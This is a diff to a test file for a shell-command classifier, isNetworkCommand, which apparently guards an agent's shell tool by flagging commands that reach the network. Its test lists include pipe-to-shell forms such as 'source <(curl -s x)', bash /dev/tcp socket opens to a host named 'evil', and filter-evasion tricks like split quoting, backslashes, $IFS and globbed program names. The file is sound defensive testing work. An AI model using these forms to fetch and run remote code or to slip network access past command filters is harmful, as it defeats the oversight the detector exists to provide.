@@ -20,16 +20,22 @@ const ATTACKS = ["bash -c \"curl x\"", "sh -c 'curl x'", "eval curl x", "echo $(
   "whois example.com", "gh api repos/a/b", "npm install left-pad", "npx cowsay hi", "pnpm add x", "yarn add x", "pip install requests",
   "python3 -m pip install x", "brew install jq", "uv run --with httpx script.py", "git submodule update --init", "bash <<< \"curl x\"",
   "echo 'curl x' | bash", "source <(curl -s x)", "zsh -lc 'curl x'", "fish -c 'curl x'"];
+// Re-review 1: bash's /dev/tcp sockets, quoting that splits a program name, and a program word the shell expands at run time.
+const OBFUSCATED = ["exec 3<>/dev/tcp/evil/80", "cat < /dev/tcp/h/80", "c\"\"url x", "'cu''rl' x", "cu\\rl x", "curl$IFS'x'",
+  "echo hi > /dev/udp/h/53", "\"w\"g\"e\"t x", "$CMD https://x", "sudo $CMD x", "/usr/bin/cu* x", "c?rl x"];
 const COMPOUND = ["ls && curl -s x | jq .", "cd repo; git pull || true", "make build & wget -q x", "test -f a || (cd b && git fetch)",
   "for f in *.txt; do echo $f; done; ssh mini ls"];
 const LOCAL = ["ls -la", "git log -n 5", "git status", "cat README.md", "grep -rn http src", "echo https://example.com", "python3 script.py",
   "rsync -a ./a ./b", "node build.js", "scp ./a ./b", "cat notes-about-curl.md", "npm run build", "ls | xargs wc -l", "source ./env.sh",
-  "ls && git diff | head -n 20"];
+  "ls && git diff | head -n 20", "ls *.txt", "echo $HOME", "rm -f \"$TMP/x\"", "cat 'notes about curl.md'"];
 
 describe("tool.shell_netread", () => {
   it("flags every network reader", () => { for (const c of NETWORK) expect([c, isNetworkCommand(c).network]).toEqual([c, true]); });
   it("flags every wrapper, subshell and indirection form (a miss frames attacker text instead of withholding it)", () => {
     for (const c of ATTACKS) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
+  });
+  it("sees through /dev/tcp, split quoting and backslashes, and counts a program the shell expands as network", () => {
+    for (const c of OBFUSCATED) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
   });
   it("any network segment of a compound command makes the whole command network", () => {
     for (const c of COMPOUND) expect([c, isNetworkCommand(c).network]).toEqual([c, true]);
